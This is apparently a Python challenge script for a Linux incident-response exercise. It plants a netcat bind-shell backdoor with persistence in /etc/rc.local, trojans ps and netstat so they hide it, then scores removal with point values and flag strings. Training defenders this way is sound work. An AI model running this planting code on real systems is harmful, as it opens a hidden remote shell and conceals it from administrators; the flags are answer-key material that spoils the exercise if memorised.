import subprocess, random, hashlib, string, os, json

def hash_file(p):
  f = open(p,"rb")
  d = f.read()
  f.close()
  return hashlib.sha256(d).hexdigest()

def run_and_capture(l):
  data = subprocess.run(l, stdout=subprocess.PIPE).stdout.decode('utf8')
  if data[-1:] == "\n":
    data = data[:-1]
  return data

def write_to_file(f,c):
  fh = open(f,"w")
  fh.write(c)
  fh.close()
def get_file_contents(f):
  f = open(f, "r")
  t = f.read()
  f.close()
  return t
def rand_str(x):
  return ''.join([random.choice(string.ascii_letters + string.digits) for n in range(x)])

def install_package_from_repo(package):
  run_and_capture(["apt-get","install","-y",package])

""" Sets up the initial environment and returns a dictionary of its state and an instruction string. The state is then passed on to the check method."""
def initialize():
  
  working_dir = ".session-{0}".format(rand_str(6))
  os.mkdir(working_dir,700)

  script = "No malicious processes or malware may be present. There should be no changes to standard Linux utilities outside of the original version from its given repository."

  malicious_packages = ["netcat"]

  dependencies = ["coreutils", "net-tools"]

  for d in dependencies:
    install_package_from_repo(d)
  
  original_ps = run_and_capture(["which", "ps"])
  sh_path = run_and_capture(["which", "sh"])
  original_netstat = run_and_capture(["which", "netstat"])

  malicious_process = rand_str(10)
  persistence_name = rand_str(10)
  malicious_port = random.randint(1025,65534)

  original_ps_hash = hash_file(original_ps)
  original_netstat_hash = hash_file(original_netstat)

  original_ps_path = original_ps.split("/")[:-1]
  original_netstat_path = original_netstat.split("/")[:-1]

  new_ps_name = "." + rand_str(6)
  new_netstat_name = "." + rand_str(6)

  malicious_process_path = "/".join(original_ps_path + [malicious_process])
  persistence_path = "/".join(original_ps_path + [persistence_name])
  
  new_ps = "/".join(original_ps_path + [new_ps_name])
  new_netstat  = "/".join(original_netstat_path + [new_netstat_name])

  run_and_capture(["cp",original_ps, new_ps])
  run_and_capture(["cp",original_ps, working_dir])
  run_and_capture(["cp",original_netstat, new_netstat])
  run_and_capture(["cp",original_netstat, working_dir])

  new_ps_script = """#!{0}
{1} $@ | egrep -v '{2}|{3}|{4}|{5}|egrep|cat|sed|{6}' | sed -e 's+/bin/sh /bin/ps+/bin/ps+g' """.format(sh_path,new_ps,malicious_process,malicious_port,new_ps_name,new_netstat_name,persistence_name)
  new_netstat_script = """#!{0}
{1} $@ | egrep -v '{2}' """.format(sh_path,new_netstat,malicious_port)

  write_to_file(original_ps,new_ps_script)
  write_to_file(original_netstat,new_netstat_script)

  for p in malicious_packages:
    install_package_from_repo(p)

  nc_path = run_and_capture(["which","netcat"])
  run_and_capture(["cp",nc_path, malicious_process_path])

  malicious_process_startup = """#!{0}
cp {1} {2}
rm /tmp/p; mkfifo /tmp/p;
(while true; do cat /tmp/p | {2} -l -p {3} | {0} >/tmp/p; sleep ; done; ) &""".format(sh_path,nc_path,malicious_process_path,malicious_port)

  write_to_file(persistence_path,malicious_process_startup)

  run_and_capture(["chmod","+x",persistence_path])

  persistence_entry_file = "/etc/rc.local"
  persistence_string = "{0} &\n".format(persistence_path)

  f = open(persistence_entry_file, "r+")
  text = f.read()
  f.seek(0)
  f.write(persistence_string + text)
  f.close()

  os.system(persistence_path)

  state = {
    "malicious_process" :malicious_process_path,
    "malicious_port" :malicious_port,
    "original_ps_hash" :original_ps_hash,
    "original_netstat_hash" :original_netstat_hash,
    "original_ps" :original_ps,
    "original_netstat" :original_netstat,
    "new_ps" : new_ps,
    "new_netstat" : new_netstat,
    "persistence_path" :persistence_path,
    "persistence_entry_file" :persistence_entry_file,
    "persistence_string" :persistence_string,
    "working_dir" : working_dir
  }
  results = { "script" : script, "initial_state" : state }
  return results

def process_list():
  l = {}
  for p in os.listdir('/proc'):
    if p == 'curproc':
      continue
    try:
      with open('/proc/{}/cmdline'.format(p), mode='rb') as fd:
        cmd = fd.read().decode().split('\x00')
        l[p] = cmd
    except:
      continue
  return l

def get_pids_from_name(n):
  pslist = process_list()
  pids = []
  for k in pslist.keys():
    if n in ' '.join(pslist[k]):
      pids.append(k)
  return pids

""" Conducts checks based on the initial state configuration. Returns the results of the checks via a list of message and point value dicts"""
def check(state):
  results = []
 

  #check if netstat is repaired 
  original_netstat = run_and_capture(["which", "netstat"])
  original_netstat_hash = hash_file(original_netstat)
  netstat_check = { "max": 3, "id": 0, "value" : 0}
  if original_netstat_hash == state["original_netstat_hash"]:
    netstat_check["value"] = 3
    netstat_check[ "msg" ] = "The `netstat` command has been repaired - flag: netstat-has-been-fixed-a8028b8181ae3061cc81b8e69662434e"
  results.append(netstat_check)

  #check if ps is repaired
  original_ps = run_and_capture(["which", "ps"])
  original_ps_hash = hash_file(original_ps)
  ps_check = { "max": 3, "id": 1, "value" : 0, "msg" : ""}
  if original_ps_hash == state["original_ps_hash"]:
    ps_check["value"] = 3
    ps_check["msg"] = "The `ps` command has been repaired - flag: ps-has-been-repaired-dcad2a27f96f6a14e148e2d2cf760f75"
  results.append(ps_check)

  #check if rc.local is repaired
  persistence_check = { "max" : 1, "id" : 2, "value" : 0 , "msg" : ""}
  text = get_file_contents(state["persistence_entry_file"])
  if state["persistence_string"] not in text:
    persistence_check["value"] = 1
    persistence_check["msg"] = "Malware persistence in rc.local has been removed. flag: rc.local-is-gone-93c1f4d4a9f8e471265078553835afae"
  results.append(persistence_check)

  #check if malware is in the process list
  running_check = { "max" : 2, "id" : 3, "value" : 0 , "msg" : ""}
  badpids = get_pids_from_name(state["persistence_path"]) + get_pids_from_name(state["malicious_process"])
  if len(badpids) < 1:
    running_check["value"] = 2
    running_check["msg"] = "Netcat backdoor no longer in process list. your flag is: netcat_is_gone-944d8e211a4c28acc0c31283dab31e5e"
  results.append(running_check)

  #check if associated malware files on disk have been removed
  files_check = { "max" : 1, "id" : 4, "value" : 0 , "msg" : ""} 
  if not os.path.isfile(state["persistence_path"]) and not os.path.isfile(state["malicious_process"]) and not os.path.isfile(state["new_netstat"]) and not os.path.isfile(state["new_ps"]):
    files_check["value"] = 1
    files_check["msg"] = "All associated files with netcat backdoor have been removed. flag is: backdoor-removed-2aa4875ec9158d97a1ab64086279adc1"

  return results

def cleanup(state):
  badpids = get_pids_from_name(state["persistence_path"]) + get_pids_from_name(state["malicious_process"])
  if(len(badpids)>0):
    run_and_capture(["kill"]+badpids)
  run_and_capture(["mv",state["working_dir"] +"/ps",state["original_ps"]])
  run_and_capture(["mv",state["working_dir"] +"/netstat",state["original_netstat"]])
  run_and_capture(["rmdir",state["working_dir"]])
  run_and_capture(["rm",state["new_netstat"]])
  run_and_capture(["rm",state["new_ps"]])
  run_and_capture(["rm",state["persistence_path"]])
  run_and_capture(["rm",state["malicious_process"]])

  text = get_file_contents(state["persistence_entry_file"])

  text = text.replace(state["persistence_string"],"")
  write_to_file(state["persistence_entry_file"],text)



def unit_tests():
  data = initialize()
  print(json.dumps(data))
  print(json.dumps(check(data["initial_state"])))
  cleanup(data["initial_state"])
  print(json.dumps(check(data["initial_state"])))

